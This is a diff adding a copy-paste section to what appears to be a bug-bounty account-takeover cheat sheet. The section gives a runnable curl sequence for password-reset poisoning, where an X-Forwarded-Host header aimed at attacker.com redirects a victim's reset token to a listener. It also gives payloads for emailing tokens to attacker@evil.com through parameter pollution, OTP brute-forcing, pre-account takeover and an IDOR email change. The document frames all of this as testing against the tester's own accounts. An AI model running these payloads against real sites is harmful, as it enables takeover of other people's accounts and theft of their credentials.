@@ -17,6 +17,55 @@ own** (attacker `A`, victim `B`); every proof ends "as `A`, I'm inside `B`." Res
 
 ---
 
+## 0.1 The whole attack in one sequence (copy-paste — reset-poisoning → ATO)
+
+*What & when:* the end-to-end flagship as one runnable narrative — the arsenal twin of guide **§2.1**. `B` is your own second account; the moment `/api/me` returns `B`'s email you **stop and restore `B`'s password**. The invariant: only `B` should ever hold `B`'s reset token.
+
+```bash
+T=https://target.com ; LISTENER=attacker.com ; B='victim-B@example.com'   # authorized target + YOUR own B
+
+# --- Step 1: trigger a reset FOR B, poisoning the host the link is built from (unauthenticated) ---
+curl -s "$T/api/password/forgot" -H "X-Forwarded-Host: $LISTENER" \
+     -H 'Content-Type: application/json' -d "{\"email\":\"$B\"}"
+#   -> generic 200 ("if that account exists...") — ignore it; the PROOF is the token reaching your listener.
+
+# --- Step 2/3: B's email now contains  https://attacker.com/reset?token=<B_TOKEN> .  When B clicks
+#     (or the reset PAGE loads your resource -> Referer leak / mail pre-fetch = fully 0-click), your log shows:
+#        GET /reset?token=b3F1c2R0a2Vu9aZ...   Host: attacker.com   src=<B's IP>
+TOK='b3F1c2R0a2Vu9aZ...'                                  # <- read B's real token out of your listener log
+
+# --- Step 4: consume B's token on the REAL origin, set a password YOU know ---
+curl -s "$T/api/password/reset" -H 'Content-Type: application/json' \
+     -d "{\"token\":\"$TOK\",\"password\":\"AtoPoc-Marker-2026!\"}"        # -> 200 {"status":"password updated"}
+
+# --- Step 5: log in as B and prove cross-account access (the finding) ---
+curl -s "$T/api/login" -H 'Content-Type: application/json' \
+     -d "{\"email\":\"$B\",\"password\":\"AtoPoc-Marker-2026!\"}" -c b.jar         # -> B's session
+curl -s "$T/api/me" -b b.jar                                                        # -> {"email":"victim-B@..."} == INSIDE B
+
+# --- STOP: one /api/me read is the whole proof. Restore B's password (you own B). Report CWE-640, ~9.8 unauth.
+```
+
+**Alternate cash-outs (same "prove you're inside B, then stop" ending — pick by which door is sloppy):**
+```bash
+# Reset accepts two emails (HPP) -> B's token mailed to YOU, no click needed (Guide §5):
+curl -s "$T/api/password/forgot" -H 'Content-Type: application/json' \
+     -d '{"email":["victim-B@example.com","attacker@evil.com"]}'          # token arrives in attacker@evil inbox
+
+# OTP has no / resettable rate-limit -> bounded brute on YOUR OWN account proves the gap (Guide §7):
+python3 poc/otp_bruteforce.py --url "$T/api/2fa/verify" --own-account --bounded   # detects missing limiter; never cracks a real user
+
+# Pre-account-takeover -> claim B's email now, B's later SSO merges into your account (Guide §10.1):
+curl -s "$T/api/register" -H 'Content-Type: application/json' \
+     -d '{"email":"victim-B@example.com","password":"Attacker-Knows-This-1!"}'     # then SSO as B -> land in YOUR record
+
+# IDOR on change-email -> as A, change B's email, then reset to it (Guide §12):
+curl -s "$T/api/users/<B_ID>/email" -b a.jar -H 'Content-Type: application/json' \
+     -d '{"email":"attacker@evil.com"}'                                            # 200 with no object-authz check = ATO
+```
+
+---
+
 ## 1. Password-reset poisoning — host / link control (Guide §2)
 
 *What this does & when to use it:* forces the victim's reset **email** to point at **your** server, so their secret reset token lands with you when the link is followed (or server-fetched). Use it on the "forgot password" request — trigger the reset **for B**, add one of these headers/fields, and watch your listener for B's token. Each line is a different way to smuggle your host past validation (plain `Host`, the `X-Forwarded-*` variants, the `user@host` userinfo trick, CRLF dual-host); the `reset_url`/`callbackUrl` JSON fields are the easy version some APIs hand you. Try them one at a time.
